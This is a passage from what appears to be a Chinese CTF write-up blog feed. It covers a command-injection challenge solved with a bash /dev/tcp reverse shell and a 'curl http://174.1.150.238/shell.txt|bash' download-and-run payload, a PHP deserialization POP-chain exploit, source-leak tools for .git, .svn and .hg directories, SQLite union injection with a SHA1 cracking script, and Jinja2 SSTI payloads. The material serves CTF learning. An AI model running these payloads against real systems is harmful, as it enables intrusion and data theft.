class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post一个girl_friend然后绕过一些正则比配之后就<code>exec()</code>，<code>exec()</code>和<code>system()</code>不同，<code>exec()</code>无回显，所以要考虑反弹shell，这里curl没有被ban掉</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在web服务目录下创建shell.txt文件，ip和port自己改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">girl_friend=curl http:<span class="comment">//174.1.150.238/shell.txt|bash</span></span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/shell.png" class=""><p>可以看到应该是要自己找flag，用linux命令 find/-name flag，成功找到</p><img src="/2020/03/29/BJD2MRCTF/shell1.png" class=""><h4 id="0X04：ezpop-看wp复现的"><a href="#0X04：ezpop-看wp复现的" class="headerlink" title="0X04：ezpop(看wp复现的)"></a>0X04：ezpop(看wp复现的)</h4><p>打开题目网址，拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据Y1ing师傅的wp（附上链接：https:<span class="comment">//www.gem-love.com/ctf/2184.html#Ezpop）</span></span><br><span class="line"><span class="number">1.</span>__wakeup()方法通过preg_match()将<span class="keyword">$this</span>-&gt;source做字符串比较，如果<span class="keyword">$this</span>-&gt;source是Show类，就调用了__toString()方法；</span><br><span class="line"><span class="number">2.</span>__toString()访问了str的source属性，str是Test类，不存在source属性，就调用了Test类的__get()魔术方法；</span><br><span class="line"><span class="number">3.</span>__get()方法将p作为函数使用，p实例化为Modify类，就调用了Modifier的__invoke()方法；</span><br><span class="line"><span class="number">4.</span>__invoke()调用了append()方法，包含$value，若将$value为伪协议，则可读flag.php源码</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$r = <span class="keyword">new</span> Modifer();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p=$r;</span><br><span class="line">$s-&gt;str=$t;</span><br><span class="line">$s-&gt;source=$s;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> BJD2&amp;MRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息泄露</title>
      <link href="/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h4 id="0x01：-hg源码泄漏"><a href="#0x01：-hg源码泄漏" class="headerlink" title="0x01：.hg源码泄漏 "></a><strong>0x01：.hg源码泄漏</strong> <a id="more"></a></h4><p>漏洞成因：hg init 的时候会生成.hg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><p>漏洞利用:dvcs-ripper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02: .git源码泄漏"></a>0x02: .git源码泄漏</h4><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>漏洞利用:GitHack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x03-DS-Store文件泄漏"><a href="#0x03-DS-Store文件泄漏" class="headerlink" title="0x03:  .DS_Store文件泄漏"></a>0x03:  .DS_Store文件泄漏</h4><p>漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store,被发现后，获取敏感信息.</p><p>漏洞利用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure><p>工具:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure><h4 id="0x04-网站备份压缩文件"><a href="#0x04-网站备份压缩文件" class="headerlink" title="0x04:网站备份压缩文件"></a>0x04:网站备份压缩文件</h4><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>漏洞成因：</p><ul><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ul><p>漏洞测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h4 id="0x05-SVN文件泄漏"><a href="#0x05-SVN文件泄漏" class="headerlink" title="0x05:SVN文件泄漏"></a>0x05:SVN文件泄漏</h4><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x06：WEB-INF-web-xml泄漏"><a href="#0x06：WEB-INF-web-xml泄漏" class="headerlink" title="0x06：WEB-INF/web.xml泄漏"></a>0x06：WEB-INF/web.xml泄漏</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要文件或目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</span><br></pre></td></tr></table></figure><p>0x07：CVS泄漏</p><p>漏洞利用:</p><p>取回源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;查看所有的改变的命令，转到download的目录</span><br></pre></td></tr></table></figure><p>工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 敏感信息 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防daliy</title>
      <link href="/2020/03/11/%E6%94%BB%E9%98%B2daliy/"/>
      <url>/2020/03/11/%E6%94%BB%E9%98%B2daliy/</url>
      
        <content type="html"><![CDATA[<h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>拿到网页，正常操作scan扫一发</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class=""><p>访问login.php页面，查看网页源码，有提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> Remove ?debug-Parameter! --&gt;</span></span><br></pre></td></tr></table></figure><p>重新访问login.php?debug,拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到是SQLite3，查找资料知道sqlite自带的结构表sqlite_master，sql是sqlite_master中的一个字段，注入时经常用到的</p><p>下面就是用sql进行对数据库的查询</p><p><code>usr=1&#39; union select name,sql from sqlite_master--+&amp;pw=</code></p><p>可以得到set-cookie:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>下面就是分别查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`usr=1' union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span><span class="comment">--+&amp;pw=`  ----name=+admin</span></span><br><span class="line"><span class="string">`usr=1' union select id,password from Users--+&amp;pw=`</span> <span class="comment">----name=+3fab54a50e770d830c0416df817567662a9dc85c;</span></span><br><span class="line"><span class="string">`usr=1' union select id,hint from Users--+&amp;pw=`</span><span class="comment">----name=+my+fav+word+in+my+fav+paper%3F%21;</span></span><br></pre></td></tr></table></figure><p>结合上面的源码以及给出的hint，password=str(unknown).”Salz!”,应该要用已知的密码在题目给出的文档中找出加密后相同的那段字符串，也就是进行碰撞，下面给出大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br></pre></td></tr></table></figure><p>跑出的密码为ThinJerboa，在admin.php页面登录就可以拿到flag</p><p>（还有一种方法是这段密码刚好可以进行md5解密，去掉题目给出的那部分刚好是ThinJerboa）</p><h4 id="0X02-shrine-20-03-12"><a href="#0X02-shrine-20-03-12" class="headerlink" title="0X02:shrine 20-03-12"></a>0X02:shrine 20-03-12</h4><p>打开网页，整理一下给出的python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>审一下，发现’()’会被替换为空，在blacklist中的会被置为None，提交的参数在/shrine/的路径下</p><p>下面来进行一下测试</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class=""><p>通过查阅SSTI模板引擎注入图可以知道应该是jinja2+flask</p><p>由于这里的变量config被禁用，暂时没想到什么办法，看了其他师傅的wp，知道了要用python的沙箱逃逸方法，查了有关flask的内置函数，以下是资料</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br></pre></td></tr></table></figure><p>下面用get_flashed_messages()的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class=""><p>可以找到current_app,继续注入当前app的config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以找到flag，这里就不贴了</p><h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>拿到题目，scan冲一发</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class=""><p>发现有robots.txt，访问，下载源码user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 